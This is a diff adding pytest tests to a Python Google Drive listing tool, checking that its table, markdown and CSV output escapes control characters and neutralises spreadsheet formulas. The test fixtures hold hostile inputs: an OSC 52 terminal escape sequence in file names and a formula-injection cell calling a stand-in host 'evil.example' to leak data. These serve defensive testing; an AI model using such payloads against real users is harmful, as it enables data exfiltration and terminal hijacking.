@@ -1,5 +1,7 @@
 """Tests for gdrives.listing — DriveEntry, collection, formatters, and ls()."""
 
+import csv
+import io
 from unittest.mock import patch
 
 import pytest
@@ -143,6 +145,28 @@ class TestFormatTable:
     def test_empty_rows(self):
         assert format_table([]) == ""
 
+    def test_control_characters_in_names_are_escaped(self):
+        # A shared item named with an OSC 52 sequence must not reach the terminal
+        # raw: it could set the clipboard or rewrite the rows around it.
+        rows = [
+            DriveEntry("u", "\x1b]52;c;ZQ==\x07x.pdf", "x", "pdf", "2026-01-15", "o"),
+            DriveEntry("u", "plain.txt", "plain.txt", "txt", "2026-01-15", "o"),
+        ]
+        result = format_table(rows)
+        assert "\x1b" not in result and "\x07" not in result
+        assert "\\x1b]52;c;ZQ==\\x07x.pdf" in result
+        # Columns are measured after escaping, so they still line up.
+        first, second = result.splitlines()
+        assert first.index("2026-01-15") == second.index("2026-01-15")
+
+    def test_missing_modified_date_keeps_columns_aligned(self):
+        rows = [
+            DriveEntry("u", "a", "a", "txt", "2026-01-15", "owner@x.com"),
+            DriveEntry("u", "b", "b", "txt", "", "owner@x.com"),
+        ]
+        first, second = format_table(rows).splitlines()
+        assert first.index("owner@x.com") == second.index("owner@x.com")
+
 
 # -- format_markdown --
 
@@ -184,6 +208,15 @@ class TestFormatMarkdown:
         assert "- file.txt" in result
         assert "[" not in result
 
+    def test_control_characters_in_names_are_escaped(self):
+        # A saved map is read back with cat or less as often as with a viewer,
+        # so an OSC 52 sequence in a name must not reach the file raw.
+        name = "\x1b]52;c;ZQ==\x07x.pdf"
+        rows = [DriveEntry("https://u", name, name, "pdf", "2026-01-15", "o")]
+        result = format_markdown(rows)
+        assert "\x1b" not in result and "\x07" not in result
+        assert result == "- [\\x1b\\]52;c;ZQ==\\x07x.pdf](https://u)\n"
+
 
 # -- format_csv --
 
@@ -212,6 +245,31 @@ class TestFormatCsv:
         result = format_csv(rows)
         assert "dir," in result
         assert "dir/," not in result
+
+    def test_formula_like_cells_are_kept_as_text(self):
+        # A shared file's name (and so its path and type) is attacker-chosen;
+        # a spreadsheet app opening the CSV must not evaluate it.
+        name = '=HYPERLINK("http://evil.example/leak","x")'
+        rows = [DriveEntry("https://url", name, name, "+cmd", "", "@owner")]
+        (parsed,) = list(csv.DictReader(io.StringIO(format_csv(rows))))
+        assert parsed["name"] == "'" + name
+        assert parsed["path"] == "'" + name
+        assert parsed["type"] == "'+cmd"
+        assert parsed["owner"] == "'@owner"
+        assert parsed["url"] == "https://url"
+
+    def test_control_characters_in_cells_are_escaped(self):
+        # A saved CSV is read back with cat or less too, so an OSC 52 sequence
+        # in a name must not reach the file raw. The formula prefix still
+        # applies first, so a cell hiding one behind a tab keeps its quote.
+        name = "\x1b]52;c;ZQ==\x07x.pdf"
+        rows = [DriveEntry("https://u", name, name, "\t=cmd", "2026-01-15", "o")]
+        result = format_csv(rows)
+        assert "\x1b" not in result and "\x07" not in result and "\t" not in result
+        (parsed,) = list(csv.DictReader(io.StringIO(result)))
+        assert parsed["name"] == "\\x1b]52;c;ZQ==\\x07x.pdf"
+        assert parsed["path"] == "\\x1b]52;c;ZQ==\\x07x.pdf"
+        assert parsed["type"] == "'\\x09=cmd"
 
 
 # -- ls --
@@ -270,6 +328,57 @@ class TestLs:
         assert mock_collect.call_count == 1  # single API traversal feeds both files
 
     @patch("gdrives.listing.collect")
+    def test_save_as_csv_rows_end_in_one_crlf(self, mock_collect, tmp_path):
+        # The rendered CSV is written byte for byte: no text-mode translation
+        # turns its \r\n row endings into \r\r\n on Windows.
+        mock_collect.return_value = [
+            DriveEntry("https://url", "a.txt", "a.txt", "txt", "2026-01-15", "o"),
+        ]
+        out_path = tmp_path / "out.csv"
+        ls("folder_id", save_as=[str(out_path)])
+        data = out_path.read_bytes()
+        assert data == format_csv(mock_collect.return_value).encode()
+        assert data.count(b"\r\n") == 2 and b"\r\r\n" not in data
+
+    @patch("gdrives.listing.collect")
+    def test_save_as_suffix_is_case_insensitive(self, mock_collect, tmp_path):
+        mock_collect.return_value = [
+            DriveEntry("https://url", "a.txt", "a.txt", "txt", "2026-01-15", "o"),
+        ]
+        md_path, csv_path = tmp_path / "MAP.MD", tmp_path / "DATA.Csv"
+        ls("folder_id", save_as=[str(md_path), str(csv_path)])
+        assert md_path.read_text() == "- [a.txt](https://url)\n"
+        assert csv_path.read_text().startswith("path,name,type")
+
+    def test_given_service_is_reused_for_the_walk(self, monkeypatch):
+        rec = {}
+        monkeypatch.setattr(
+            "gdrives.listing.build_drive_service",
+            lambda: pytest.fail("must reuse the caller's service"),
+        )
+        monkeypatch.setattr(
+            "gdrives.listing.collect",
+            lambda folder_id, *, depth, _service: rec.update(service=_service) or [],
+        )
+        service = object()
+        ls("folder_id", service=service)
+        assert rec["service"] is service
+
+    def test_given_service_is_reused_for_shared_with_me(self, monkeypatch):
+        rec = {}
+        monkeypatch.setattr(
+            "gdrives.listing.build_drive_service",
+            lambda: pytest.fail("must reuse the caller's service"),
+        )
+        monkeypatch.setattr(
+            "gdrives.listing.list_shared_with_me",
+            lambda service: rec.update(service=service) or [],
+        )
+        service = object()
+        ls(shared_with_me=True, service=service)
+        assert rec["service"] is service
+
+    @patch("gdrives.listing.collect")
     def test_save_as_rejects_unknown_suffix(self, mock_collect, tmp_path):
         # The domain rejects an unexpected extension rather than silently writing
         # CSV, so callers other than the pre-validating CLI get the same guard.
@@ -313,9 +422,6 @@ class TestLs:
 
 @pytest.mark.parametrize("folder", [True, False])
 def test_csv_preserves_slashes_in_actual_names(folder):
-    import csv
-    import io
-
     name = "literal//"
     row = DriveEntry(
         "url",
